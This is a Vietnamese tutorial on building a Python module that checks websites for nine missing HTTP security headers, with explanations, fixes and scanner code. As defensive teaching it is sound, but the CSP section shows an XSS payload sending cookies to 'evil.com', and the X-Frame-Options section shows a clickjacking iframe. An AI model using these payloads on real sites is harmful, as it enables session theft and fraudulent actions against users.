# Task 1.2 — `HeadersModule` (Quét HTTP Security Headers)

> **Mục tiêu:** Xây dựng module đầu tiên kế thừa `BaseModule`, kiểm tra **9** HTTP Security Headers (7 header cơ bản + 2 header cô lập tab COOP/COEP).

---

## 📚 Lý thuyết: HTTP Security Headers

### HTTP Headers là gì?

Khi trình duyệt truy cập website, server trả về **response** bao gồm:
- **Body**: Nội dung HTML/CSS/JS hiển thị trên trang
- **Headers**: Các "chỉ thị" gửi kèm, hướng dẫn trình duyệt cách xử lý response

Ví dụ response headers:
```
HTTP/1.1 200 OK
Content-Type: text/html
X-Frame-Options: DENY              ← Security header
Content-Security-Policy: default-src 'self'  ← Security header
```

### Tại sao Security Headers quan trọng?

Security Headers là **lớp phòng thủ đầu tiên** — chúng chỉ dẫn trình duyệt cách bảo vệ người dùng. **Thiếu headers = mở cửa cho kẻ tấn công.**

---

## 📚 9 Security Headers cần kiểm tra

### 1. Content-Security-Policy (CSP) — `severity: high`

**Chức năng:** Chỉ cho phép load script/style/image từ nguồn tin cậy.

**Thiếu thì sao?** Dễ bị **XSS** (Cross-Site Scripting) — kẻ tấn công chèn mã JavaScript độc hại vào trang web.

**Ví dụ tấn công XSS:**
```html
<!-- Kẻ tấn công chèn vào comment box -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**Cách fix:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';
```
→ Trình duyệt chỉ cho phép load tài nguyên từ chính domain của website (`'self'`).

---

### 2. Strict-Transport-Security (HSTS) — `severity: high`

**Chức năng:** Ép trình duyệt **luôn dùng HTTPS**, kể cả khi người dùng gõ `http://`.

**Thiếu thì sao?** Bị **Man-in-the-Middle** — kẻ tấn công đứng giữa đường truyền, đọc/sửa dữ liệu.

**Ví dụ tấn công:**
```
Người dùng → http://bank.com → [Hacker chặn giữa] → https://bank.com
                                  ↓
                          Đọc username/password
```

**Cách fix:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
→ `max-age=31536000` = ép dùng HTTPS trong 1 năm (365 × 24 × 60 × 60 giây).

---

### 3. X-Frame-Options — `severity: medium`

**Chức năng:** Chặn website bị nhúng vào `<iframe>` của trang khác.

**Thiếu thì sao?** Bị **Clickjacking** — kẻ tấn công đặt website của bạn trong iframe trong suốt, lừa người dùng click vào nút ẩn.

**Ví dụ tấn công:**
```html
<!-- Trang giả mạo -->
<h1>Bạn trúng thưởng! Click nhận quà!</h1>
<button>NHẬN QUÀ</button>

<!-- Iframe ẩn phía trên button -->
<iframe src="https://bank.com/transfer?to=hacker" style="opacity:0; position:absolute; top:0;">
</iframe>
<!-- Người dùng tưởng click "Nhận quà" nhưng thực ra click "Chuyển tiền" -->
```

**Cách fix:**
```
X-Frame-Options: DENY          ← Không cho iframe ở đâu cả
X-Frame-Options: SAMEORIGIN    ← Chỉ cho iframe cùng domain
```

---

### 4. X-Content-Type-Options — `severity: medium`

**Chức năng:** Chặn trình duyệt **đoán sai kiểu file** (MIME sniffing).

**Thiếu thì sao?** Trình duyệt có thể hiểu nhầm file `.txt` thành `.html` rồi chạy JavaScript bên trong.

**Cách fix:**
```
X-Content-Type-Options: nosniff
```
→ Giá trị duy nhất. Trình duyệt chỉ tin `Content-Type` server gửi, không tự đoán.

---

### 5. X-XSS-Protection — `severity: low`

**Chức năng:** Bộ lọc XSS tích hợp sẵn trong trình duyệt cũ.

**Lưu ý:** Header này **đã bị deprecated** — Chrome/Edge đã bỏ. CSP mạnh hơn nhiều. Nhưng vẫn check vì một số trình duyệt cũ còn hỗ trợ.

**Cách fix:**
```
X-XSS-Protection: 1; mode=block
```

---

### 6. Referrer-Policy — `severity: low`

**Chức năng:** Kiểm soát thông tin URL gửi kèm khi người dùng click link sang trang khác.

**Thiếu thì sao?** URL có thể chứa thông tin nhạy cảm (token, ID...) bị lộ sang trang khác:
```
https://app.com/reset-password?token=abc123
                                      ↓
Khi click link → Trang đích nhận được token này qua Referer header
```

**Cách fix:**
```
Referrer-Policy: strict-origin-when-cross-origin
```

---

### 7. Permissions-Policy — `severity: medium`

**Chức năng:** Kiểm soát tính năng trình duyệt (camera, microphone, geolocation...).

**Thiếu thì sao?** Script độc hại có thể truy cập camera/mic mà không cần hỏi.

**Cách fix:**
```
Permissions-Policy: geolocation=(); microphone=(); camera=()
```
→ `()` = tắt hoàn toàn. `(self)` = chỉ cho phép domain chính.

---

### 8. Cross-Origin-Opener-Policy (COOP) — `severity: medium`

**Chức năng:** Ngăn chặn tấn công **Spectre** và các side-channel attacks bằng cách cô lập tab trình duyệt.

**Spectre là gì?** Lỗ hổng phần cứng CPU cho phép đọc bộ nhớ của process khác. Nếu 2 tab chia sẻ process → tab độc hại có thể đọc dữ liệu từ tab bank.com!

**Thiếu thì sao?** Tab độc hại có thể mở `window.open("https://bank.com")` rồi exploit Spectre để đọc dữ liệu.

**Cách fix:**
```
Cross-Origin-Opener-Policy: same-origin
```
→ Tab chỉ chia sẻ process với tab cùng origin.

---

### 9. Cross-Origin-Embedder-Policy (COEP) — `severity: medium`

**Chức năng:** Yêu cầu tất cả tài nguyên (ảnh, script, iframe) phải cho phép cross-origin rõ ràng, nếu không sẽ bị block.

**Thiếu thì sao?** Trang web có thể load tài nguyên cross-origin mà không cần permission → dễ bị side-channel attack.

**Cách fix:**
```
Cross-Origin-Embedder-Policy: require-corp
```
→ Mọi tài nguyên cross-origin phải có header `Cross-Origin-Resource-Policy` hoặc `CORS`.

> 💡 **COOP + COEP** thường đi cặp — khi cả 2 được bật, trình duyệt cho phép dùng `SharedArrayBuffer` (cần cho WebAssembly hiệu năng cao) một cách an toàn.

## 📚 Lý thuyết: Kế thừa (Inheritance) và Implement ABC

### Cách kế thừa BaseModule:

```python
class HeadersModule(BaseModule):   # ← Kế thừa từ BaseModule
    @property
    def name(self) -> str:          # ← Implement abstract property
        return "headers"

    @property
    def description(self) -> str:   # ← Implement abstract property
        return "Kiểm tra HTTP Security Headers"

    async def scan(self, url, **kwargs) -> list:  # ← Implement abstract method
        ...
```

Nếu **thiếu bất kỳ method nào** → `TypeError: Can't instantiate abstract class...`

### Class Variable vs Instance Variable

```python
class HeadersModule(BaseModule):
    # Class Variable — dùng chung cho TẤT CẢ instance
    SECURITY_HEADERS = [...]    # ← Chỉ cần 1 bản, dùng self.SECURITY_HEADERS

    async def scan(self, url):
        findings = []           # ← Instance Variable — mỗi lần gọi scan có list riêng
```

## 📚 Lý thuyết: httpx — HTTP Client Async

### Tại sao dùng httpx thay vì requests?

| | `requests` | `httpx` |
|--|-----------|---------|
| Async | ❌ Không hỗ trợ | ✅ `AsyncClient` |
| HTTP/2 | ❌ | ✅ |
| API giống nhau | — | ✅ Gần giống requests |

> ℹ️ HTTP/2 của `httpx` chỉ bật khi cài thêm `httpx[http2]` và truyền `http2=True`; project **không** dùng HTTP/2 — chọn `httpx` chủ yếu vì có `AsyncClient`.

### Cách dùng httpx async:

```python
import httpx

async with httpx.AsyncClient(timeout=10.0) as client:
    response = await client.get("https://example.com")

    response.status_code   # 200
    response.headers       # Headers({...})
    response.text          # Nội dung HTML
```

- `async with` = tự động đóng connection khi xong
- `await` = chờ response mà **không block** các task khác

### Kiểm tra header tồn tại:

```python
headers = response.headers

# httpx trả về headers dạng case-insensitive dict
"content-type" in headers        # True
headers.get("x-frame-options")   # None nếu không có
```

## 💻 Code hoàn chỉnh

File: `backend/app/modules/headers.py`

```python
import httpx
from app.modules.base import HTTP_TIMEOUT, BaseModule

class HeadersModule(BaseModule):
    @property
    def name(self) -> str:
        return "headers"

    @property
    def description(self) -> str:
        return "Kiểm tra HTTP Security Headers"

    SECURITY_HEADERS = [
        {
            "name": "Content-Security-Policy",
            "severity": "high",
            "description": "CSP ngăn chặn XSS...",
            "remediation": "Thêm header: Content-Security-Policy: default-src 'self'"
        },
        # ... (9 headers tổng cộng: CSP, HSTS, X-Frame-Options, X-Content-Type-Options,
        #      X-XSS-Protection, Referrer-Policy, Permissions-Policy, COOP, COEP)
    ]

    async def scan(self, url: str, **kwargs) -> list:
        findings = []

        # 1. Gửi HTTP GET request (có timeout)
        async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as client:
            response = await client.get(url)

        # 2. Lấy headers từ response
        headers = response.headers

        # 3. Duyệt từng header cần check
        for header in self.SECURITY_HEADERS:
            header_name = header["name"].lower()
            if header_name not in headers:
                findings.append({
                    "module": self.name,
                    "name": header_name,
                    "severity": header["severity"],
                    "description": header["description"],
                    "remediation": header["remediation"],
                    "url": url
                })

        # 4. Trả về kết quả
        return findings
```

## 🔑 Takeaway

1. **Security Headers** = lớp phòng thủ đầu tiên của website, chỉ dẫn trình duyệt cách bảo vệ người dùng
2. **Kế thừa ABC** = implement tất cả abstract methods, nếu thiếu → Python báo lỗi
3. **httpx AsyncClient** = gửi HTTP request bất đồng bộ, không block thread
4. **Pattern chung của module quét**: Request → Phân tích → Thu thập findings → Return list
